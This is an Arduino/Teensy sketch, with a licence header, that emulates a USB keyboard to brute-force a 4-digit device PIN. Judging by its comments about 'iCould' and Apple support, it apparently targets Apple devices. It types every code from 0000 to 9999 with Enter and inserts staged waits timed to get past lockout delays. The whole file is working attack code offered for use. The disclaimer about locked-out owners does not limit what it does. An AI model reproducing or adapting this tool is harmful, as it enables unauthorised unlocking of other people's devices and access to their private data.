#include <usb_keyboard.h>
// This code is licensed under Apache 2.0 License
// http://www.apache.org/licenses/LICENSE-2.0.txt
// Limitation of Liability. In no event and under no legal theory,
// whether in tort (including negligence), contract, or otherwise,
// unless required by applicable law (such as deliberate and grossly
// negligent acts) or agreed to in writing, shall any Contributor be
// liable to You for damages, including any direct, indirect, special,
// incidental, or consequential damages of any character arising as a
// result of this License or out of the use or inability to use the
// Work (including but not limited to damages for loss of goodwill,
// work stoppage, computer failure or malfunction, or any and all
// other commercial damages or losses), even if such Contributor
// has been advised of the possibility of such damages.
// This code is indented for people who are not able to contact
// apple support and I am in no way liable for any damage or
// problems this code might cause.

const int ledPin = 13;
int counter = 0;

//waits for iCould
int firstloop = 0;
int secondloop = 0;
int thirdloop = 0;
boolean firstcompleted = false;
boolean secondcompleted = false;
int fakecounter = counter;
char pin[]="xxxx";

void setup() {
  pinMode(ledPin, OUTPUT);
  delay(10000);
  digitalWrite(ledPin, LOW);
}

void loop(){
  keyboard_modifier_keys = 0;
  //lets wait 1minute and 1 second
  if (firstloop >= 5){
    delay(61000);
    firstcompleted = true;
    digitalWrite(ledPin, LOW);
  }
  else if ((firstloop < 5) && (firstcompleted == false)){
    digitalWrite(ledPin, HIGH);
    ++firstloop;
    digitalWrite(ledPin, LOW);
  }
  //lets wait 5 minutes and one second
  if ((secondloop >= 1) && (secondcompleted == false) && (firstcompleted == true)){
    delay(301000);
    secondloop = 0;
    secondcompleted = true;
    digitalWrite(ledPin, LOW);
  }
  else if ((secondloop < 1) && (secondcompleted == false) && (firstcompleted == true)){
    ++secondloop;
    digitalWrite(ledPin, LOW);
  }
  //lets wait 15 minutes and 1 second
  if ((thirdloop >= 1) && (secondcompleted == true)){
    delay(901000);
    thirdloop = 0;
    secondcompleted = false;
    firstcompleted = false;
    firstloop = 0;
    secondloop = 0;
    thirdloop = 0;
    digitalWrite(ledPin, LOW);
  }
  else if ((thirdloop < 1) && (secondcompleted == true)){
    ++thirdloop;
    digitalWrite(ledPin, LOW);
  }
  //lets get to work
  if (counter <= 9999){
    delay(100503);
    digitalWrite(ledPin, LOW);
    delay(7049);
    digitalWrite(ledPin, HIGH);
    sprintf(pin, "%04d", fakecounter);
    Keyboard.press(pin[0]);
    delay(450);
    Keyboard.release(pin[0]);
    delay(420);
    Keyboard.press(pin[1]);
    delay(398);
    Keyboard.release(pin[1]);
    delay(510);
    Keyboard.press(pin[2]);
    delay(421);
    Keyboard.release(pin[2]);
    delay(423);
    Keyboard.press(pin[3]);
    delay(430);
    Keyboard.release(pin[3]);
    delay(525);
    Keyboard.press(KEY_ENTER);
    delay(405);
    Keyboard.release(KEY_ENTER);
    digitalWrite(ledPin, LOW);
  }
  //reached 4 digit PIN max value
  if (counter > 9999){
    for (int blinkies = 0; blinkies < 8; blinkies++) {
      digitalWrite(ledPin, HIGH);
      delay(20);
      digitalWrite(ledPin, LOW);
      delay(200);
    }
    delay(6000);
  }
  ++counter;
  fakecounter = counter;
}
